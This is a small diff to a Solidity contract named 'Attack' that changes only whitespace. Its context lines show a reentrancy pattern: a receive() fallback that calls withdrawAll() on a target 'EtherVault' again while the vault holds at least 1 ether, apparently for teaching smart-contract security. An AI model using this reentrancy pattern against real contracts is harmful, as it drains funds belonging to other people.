@@ -21,7 +21,7 @@ contract Attack {
     constructor(IEtherVault _etherVault) {
         etherVault = _etherVault;
     }
-    
+
     receive() external payable {
         if (address(etherVault).balance >= 1 ether) {
             etherVault.withdrawAll();
